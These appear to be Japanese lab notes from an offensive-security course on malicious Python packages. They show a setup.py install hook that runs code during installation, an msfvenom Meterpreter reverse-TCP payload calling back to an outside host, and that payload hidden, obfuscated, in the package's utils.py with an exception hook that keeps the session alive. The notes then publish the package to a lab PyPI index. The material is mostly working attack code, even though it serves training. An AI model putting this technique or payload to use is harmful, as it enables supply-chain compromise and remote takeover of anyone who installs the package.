### サンプルパッケージ構成
```
└── hackshort-util
    ├── setup.py
    └── hackshort_util
        ├── util.py
        └── __init__.py
```

### サンプルパッケージの作成テスト
```sh
kali@kali:~$ mkdir hackshort-util

kali@kali:~$ cd hackshort-util           

kali@kali:~/hackshort-util$ nano setup.py

kali@kali:~/hackshort-util$ cat -n setup.py
# 01  from setuptools import setup, find_packages
# 02
# 03  setup(
# 04      name='hackshort-util',
# 05      version='1.1.4',
# 06      packages=find_packages(),
# 07      classifiers=[],
# 08      install_requires=[],
# 09      tests_require=[],
# 10  )

kali@kali:~/hackshort-util$ mkdir hackshort_util

kali@kali:~/hackshort-util$ touch hackshort_util/__init__.py

# ローカルでパッケージ化
python3 ./setup.py sdist

# 作成したパッケージのインストール
pip install ./dist/hackshort-util-1.1.4.tar.gz

python3                                       
# Python 3.11.2 [GCC 12.2.0] on linux
# Type "help", "copyright", "credits" or "license" for more information.
# >>> import hackshort_util
# >>> print(hackshort_util)
# <module 'hackshort_util' from '/home/kali/.local/lib/python3.11/site-packages/hackshort_util/__init__.py'>


pip uninstall hackshort-util                   
# Found existing installation: hackshort-util 1.1.4
# Uninstalling hackshort-util-1.1.4:
#   Would remove:
#     /home/kali/.local/lib/python3.11/site-packages/hackshort_util-1.1.4.dist-info/*
#     /home/kali/.local/lib/python3.11/site-packages/hackshort_util/*
# Proceed (Y/n)? Y
#   Successfully uninstalled hackshort-util-1.1.4


```

### 悪用例
```sh
cat -n setup.py            
# 01  from setuptools import setup, find_packages
# 02  from setuptools.command.install import install
# 03
# 04  class Installer(install):
# 05      def run(self):
# 06          install.run(self)
# 07          with open('/tmp/running_during_install', 'w') as f:
# 08              f.write('This code was executed when the package was installed') <- パッケージのインストール中に任意のコマンドを実行可能
# 09
# 10  setup(
# 11      name='hackshort-util',
# 12      version='1.1.4',
# 13      packages=find_packages(),
# 14      classifiers=[],
# 15      install_requires=[],
# 16      tests_require=[],
# 17      cmdclass={'install': Installer}
# 18  )


msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.88.99.76 LPORT=4488
[-] No platform was selected, choosing Msf::Module::Platform::Python from the payload
[-] No arch selected, selecting arch: python from the payload
No encoder specified, outputting raw payload
Payload size: 436 bytes
exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGMPuUrvtYgURDyIiuHsTWdp01NI0KZmsVsX/7oYsXmZ4b968+ejHyflA0ekBgvw2fSvbBqHIJQZ/0EGGfgTy6jydaW+pb+wb8OVCbEgW/NcxZlinZpUSX8kT3j7e3O+3u6fb6wcRdUo7a0EHztmyWqmyVFWl1gWTeV6WIkpaD81AMpg1TCF6x+EKDcDELwQxddpJHezU6IGzqzsmUXnQHzwX4nnxQrr6hI0gn++9AWrA8k5cmqNdd/ZfPU+0IDCD5vFs1YF24+QBkacPqLbII9lBVMofhmyDv4L8AerjXyE=')[0])))

kali@kali:~/hackshort-util$ nano hackshort_util/utils.py
  
kali@kali:~/hackshort-util$ cat -n hackshort_util/utils.py
# 01  import time
# 02  import sys
# 03
# 04  def standardFunction():
# 05          pass
# 06
# 07  def __getattr__(name):
# 08          pass
# 09          return standardFunction
# 10
# 11  def catch_exception(exc_type, exc_value, tb):
# 12      while True:
# 13          time.sleep(1000)
# 14
# 15  sys.excepthook = catch_exception
# 16  exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGMPuUrvtYgURDyIiuHsTWdp01NI0KZmsVsX/7oYsXmZ4b968+ejHyflA0ekBgvw2fSvbBqHIJQZ/0EGGfgTy6jydaW+pb+wb8OVCbEgW/NcxZlinZpUSX8kT3j7e3O+3u6fb6wcRdUo7a0EHztmyWqmyVFWl1gWTeV6WIkpaD81AMpg1TCF6x+EKDcDELwQxddpJHezU6IGzqzsmUXnQHzwX4nnxQrr6hI0gn++9AWrA8k5cmqNdd/ZfPU+0IDCD5vFs1YF24+QBkacPqLbII9lBVMofhmyDv4L8AerjXyE=')[0])))


```

### 悪意のあるパッケージ公開
```sh

kali@kali:~/hackshort-util$ nano ~/.pypirc

# 公開先の設定
kali@kali:~/hackshort-util$ cat ~/.pypirc
# [distutils]
# index-servers = 
#     offseclab 
# 
# [offseclab]
# repository: http://pypi.offseclab.io/
# username: student
# password: password                     

# 公開先をしてアップロード（公のPyPIにアップロードしないよう注意）
python3 setup.py sdist upload -r offseclab              
# ...
# Submitting dist/hackshort-util-1.1.4.tar.gz to http://pypi.offseclab.io/
# Server response (200): OK

# アップロードしたパッケージの削除
curl -u "student:password" --form ":action=remove_pkg" --form "name=hackshort-util" --form "version=1.1.4" http://pypi.offseclab.io/
```

### pip参照のリポジトリ指定
```sh
cat -n  ~/.config/pip/pip.conf
# 1  [global]
# 2  index-url = http://pypi.offseclab.io
# 3  trusted-host = pypi.offseclab.io  
```